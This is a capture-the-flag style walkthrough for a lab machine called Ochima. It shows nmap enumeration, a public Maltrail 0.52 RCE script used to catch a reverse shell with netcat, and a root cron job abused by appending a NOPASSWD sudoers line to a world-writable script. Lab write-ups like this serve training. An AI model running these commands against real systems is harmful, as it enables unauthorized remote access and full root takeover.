##### Tags: `pspy32s`  `cron`  `writerable file`  `sudoers`  `add user`

# 🐧Ochima🐧
## Enumeration
Nmap
```console
$ nmap -p- -T4 -sV 192.168.245.32

PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.4 (Ubuntu Linux; protocol 2.0)
80/tcp   open  http    Apache httpd 2.4.52 ((Ubuntu))
8338/tcp open  http    Python http.server 3.5 - 3.10
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```
port 80 is apache page nothing interested  
port 8338 is maltrail v0.52  
search and found the rce script 
https://github.com/joshchalabi/Maltrail-0.52-Exploit-RCE
```console
$ sh exploit.sh 192.168.245.32:8338/login 192.168.45.229 80
exploit.sh: 22: [[: not found
[*] Target       : 192.168.245.32:8338/login
[*] LHOST        : 192.168.45.229
[*] LPORT        : 80
[*] Start your listener:  nc -lvnp 80
```
get the shell
```console
$ nc -lvnp 80  
listening on [any] 80 ...
connect to [192.168.45.229] from (UNKNOWN) [192.168.245.32] 49504
snort@ochima:/opt/maltrail-0.53$ id
uid=1001(snort) gid=1001(snort) groups=1001(snort)
```
## Privilege Escalation
use pspy32s found there is a cronjob running by root every minute
```console
snort@ochima:/tmp$ ./pspy32s
./pspy32s
pspy - version: v1.2.1 - Commit SHA: f9e6a1590a4312b9faa093d8dc84e19567977a6d


     ██▓███    ██████  ██▓███ ▓██   ██▓
    ▓██░  ██▒▒██    ▒ ▓██░  ██▒▒██  ██▒
    ▓██░ ██▓▒░ ▓██▄   ▓██░ ██▓▒ ▒██ ██░
    ▒██▄█▓▒ ▒  ▒   ██▒▒██▄█▓▒ ▒ ░ ▐██▓░
    ▒██▒ ░  ░▒██████▒▒▒██▒ ░  ░ ░ ██▒▓░
    ▒▓▒░ ░  ░▒ ▒▓▒ ▒ ░▒▓▒░ ░  ░  ██▒▒▒ 
    ░▒ ░     ░ ░▒  ░ ░░▒ ░     ▓██ ░▒░ 
    ░░       ░  ░  ░  ░░       ▒ ▒ ░░  
                   ░           ░ ░     
                               ░ ░     

2026/02/28 10:35:01 CMD: UID=0     PID=7807   | /bin/sh -c /var/backups/etc_Backup.sh 
2026/02/28 10:35:01 CMD: UID=0     PID=7809   | /bin/bash /var/backups/etc_Backup.sh 
2026/02/28 10:36:01 CMD: UID=0     PID=7812   | /bin/sh -c /var/backups/etc_Backup.sh 
2026/02/28 10:36:01 CMD: UID=0     PID=7813   | /bin/bash /var/backups/etc_Backup.sh 
```
we have write permission of the file
```console
snort@ochima:~$ ls -la /var/backups/etc_Backup.sh
-rwxrwxrwx 1 root root 200 Feb 28 12:43 /var/backups/etc_Backup.sh
```
add our user to sudoers
```console
snort@ochima:~$ echo 'echo "snort ALL=(ALL) NOPASSWD: ALL" >> /etc/sudoers' >> /var/backups/etc_Backup.sh
snort@ochima:~$ cat /var/backups/etc_Backup.sh
#! /bin/bash
tar -cf /home/snort/etc_backup.tar /etc
echo "snort ALL=(ALL) NOPASSWD: ALL" >> /etc/sudoers
```
```console
snort@ochima:~$ sudo -i
root@ochima:~# id
uid=0(root) gid=0(root) groups=0(root)
```
